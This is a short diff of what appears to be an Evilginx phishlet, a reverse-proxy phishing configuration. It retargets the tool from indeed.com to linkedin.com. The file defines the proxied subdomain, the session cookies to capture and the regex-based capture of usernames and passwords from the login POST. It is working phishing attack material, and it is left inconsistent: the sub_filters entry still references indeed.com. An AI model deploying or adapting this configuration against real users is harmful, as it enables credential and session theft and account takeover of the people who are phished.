@@ -1,11 +1,11 @@
 author: '@sanchal'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'indeed.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
 sub_filters:
   - {triggers_on: 'secure.indeed.com', orig_sub: 'secure', domain: 'indeed.com', search: 'https://{hostname}/auth/', replace: 'https://{hostname}/auth/', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
-  - domain: '.indeed.com'
+  - domain: '.www.linkedin.com'
     keys: []
 credentials:
   username:
@@ -17,5 +17,5 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'secure.indeed.com'
+  domain: 'www.linkedin.com'
   path: '/auth'
